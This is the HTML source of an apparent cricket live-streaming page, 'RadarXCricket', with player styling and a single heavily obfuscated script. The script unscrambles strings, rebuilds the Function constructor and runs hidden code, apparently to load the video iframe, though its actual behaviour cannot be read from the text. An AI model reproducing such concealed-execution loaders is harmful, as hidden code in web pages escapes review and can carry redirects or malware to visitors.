<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
  <!--  <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button> -->
</div>

<script>
var loadIframe;(function(){var dYZ='',qlS=810-799;function PiR(p){var l=1747621;var w=p.length;var e=[];for(var j=0;j<w;j++){e[j]=p.charAt(j)};for(var j=0;j<w;j++){var u=l*(j+221)+(l%29647);var c=l*(j+307)+(l%20518);var r=u%w;var a=c%w;var z=e[r];e[r]=e[a];e[a]=z;l=(u+c)%4054986;};return e.join('')};var Yfb=PiR('trpmeubkclurqxontgvjwcifydshzntcooasr').substr(0,qlS);var pmn='xa,+asa]21nt=p]ad(ov==fe)ysb<ea.{s=.ui=graqa tuvh+C[a;u;rAr=n+;,=b(u,9a7v7d)a5r}v+pn,l]n[ [9;),x. ;,+6,bm,>4)k6+75;oc+b,;inrsd(==+];+A(a aesa0hcn. "=]f-h;i;ox"v-t6e .hrt7)(; m==;- +=o,26eog6 =st=5;f+;v,])garf)ua7w ""+dtnjl2eheg;v;+wkv,omw)a.r;c.}lravcn,r]ia(kahrmf[,yvgrti )olenlAa,g n.}agt.xa+vo(3j=9usuj][(*.ry[0(;j;9;sfm;8yu00s yltlifh;sfk80ev=Cg(k;d r;v=(v6cu <=ue<p1uv+s)t.(on(cC<m;i;Con8At;p19vrintd) (=(,iumv=++(C7.e,mrt.pol;vole.tAev1;(r0lay1nf3ica()hp(2t([;1f"r.arto;lilslhen+vtcps4f+sfgtg8 1(1fgu0c>rootnnrrv)y1er[,oo(o+jrn}=p9e{cat)iry0;;;](.=(;4Cue..+p=h}lroli(..]]d(o(p;=h2i,r1)i*xu ]y1;jsk{<6"=-,t;r7[=esni=)!arlf[e0rh)a);t)fqnv1hv)-sc)ot,{.=kgg)7vhgqr +fo1{p" rrrSraj(8h,=[y(=;,bh,t))nz=o8c(""ah8lvat=l55= 2u9cjfs,2),(a7.d=ga=4rlv0o-+8[;" rh=v)+;g7;karC;sq]v60s r (ua2.gr[;nnl(=en+mk}po{h;uyv=pli)w=.{;cfa-o[8lk).vn1e6!tr4um(f f0Cirnhor=)boey=gdredrx,).}yilp)ak)]tjnhv)2nSq).';var GdY=PiR[Yfb];var zET='';var RUX=GdY;var qLu=GdY(zET,PiR(pmn));var jnp=qLu(PiR('n:o1ndo$5!e$ja6.1:,]gi5f%2un{t]g[Xirc6.( "f]]bilrvblX7XX_o0 o\'oz_aX0fX6ewfjXXi4}je.(,XcX=-lab 6af,!9g3 ;}\/b;.( Xeci0]%uwm.l.b{eytoe4.$rdtoa76)coX!+a9X\/o.4d_0d3&7$).$!07iinr285is)XX%-fr))$.al,l3il)cr3dy;]j.Xt9s#r XXtv_+eloadnneti;s;XX%X)("4c rr1(m6Xaioep% %t!6Xets.on}g0r%5a.IXde"X6]_t.sX3+}i) sj.dupo(sooXt(01#=rpcb}=r1(net6.($(X$s;aiby3f-Xbmt%pbavi..tX%*wd2_il{}Ei#-o69=).htp%c5ge;0n7-a(,)nt%va1;6%w%ofpeX5ntte.[l=eu!0ts]aXm.(casme)4t.e3".ifebut4brinedntr9rur5?);]Xcl5(eXX5[\/i965_,%ta#4]4b(o)tuX5v_(4,!xt\'l-7f=nph)nsya.$l84;;pXabnbo Xsw.!Xr3rlc7a(c=p5X(rfrgX,o7f_ovp4nlz$X).=(m_X!=s(r)b.l!b4bi!chmXil.1})t3ro,$Xmd=,=e2)$gg7X$,grC0+df3 wX%XX(drtb[%m\'nfX)X%m)c,+d!j*Xcl3"rX,1b.oyX4%(s2anb9pX3md.f0hnl)f;\/l!., c](wXXX; ,g4378%7vuX9Xa06j7X)et_,,yyaX=818m%j]:l;Xecl()r4{[88XSomtgge,Ca%Xt%1i4vXlr*.wao;r;)r+;Xn]*a.!m$3;XXdc}S(e(.n))7(X {Xsud)=8{boutr!b00myc;%s2)\/(=]j#0dne!g;-..}rotlrr.i{)9XXo._.!n,lo.5l$c2[alk).XX#1S80fbfXwbinX:0}nt) a"X6epa7%mer.&Co(2f2X0nrXzf(bdlX!a.f]Xs(a0={\'ed56;(dt;ad3:e.&_6n\'X\/Xd),n7X8,[_XaX.,{;3(XbX\' nXeX7-=)a4&7ectevft(tX#aa)X77]8.XXu872=sXg-7t.) Xfcdi!rr)+,\/mXdi  tX7-;!he0){l"%ii;daXdXr}4e!c+%4]X)o{!7bt( d0gbo"X3(==cl1)#(.!(-d%nm1eXbX-=).bXaX_e(1ynlo.nX(,l_tt!,o1tc,duhln\'3Xu336Xre,9C+_g)u(3.fuot,di 3,;mXX6an\/thaoXs!,e3;a.,=nXe.)%rd_].3re2*$$onXXi$i3js$$e-$a!pwo$;51X{iv-f.\/riveXl=,d,!X;nmI(d_Xi_nX_,7l.n9r$tXpn.o$n!of5(Xb78s)ogi[tX..n(X.8.X0plb=7aotdX0 7iti1gn[)d!X09 )+ i2je]X=_)ar9reed2b(5)e}g] ),n!Xfn }i;bsov,(tf;efE0X'));var oyX=RUX(dYZ,jnp );oyX(8600);return 6500})()
</script>

</body>
</html>